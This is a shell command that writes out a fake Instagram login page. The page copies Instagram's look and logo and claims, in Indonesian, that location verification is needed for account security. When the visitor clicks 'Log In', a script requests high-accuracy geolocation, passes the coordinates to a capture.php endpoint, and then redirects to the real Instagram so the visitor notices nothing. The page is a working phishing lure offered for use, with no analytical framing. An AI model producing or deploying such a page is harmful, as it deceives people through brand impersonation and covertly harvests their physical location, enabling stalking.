cat <<EOF > index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 8px; border: none; background-color: #0095f6; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
        .info { font-size: 12px; color: #8e8e8e; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_with_merch.png/145fb5157929.png" class="logo">
        <input type="text" placeholder="Phone number, username, or email">
        <input type="password" placeholder="Password">
        <button onclick="getLoc()">Log In</button>
        <p class="info">Kami memerlukan verifikasi lokasi untuk memastikan keamanan akun Anda.</p>
    </div>
    <script>
    function getLoc() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
        } else {
            window.location.href = "https://www.instagram.com";
        }
    }
    function success(pos) {
        var lat = pos.coords.latitude;
        var lon = pos.coords.longitude;
        window.location.href = "capture.php?lat=" + lat + "&lon=" + lon + "&redirect=https://www.instagram.com";
    }
    function error() {
        window.location.href = "https://www.instagram.com";
    }
    </script>
</body>
</html>
EOF
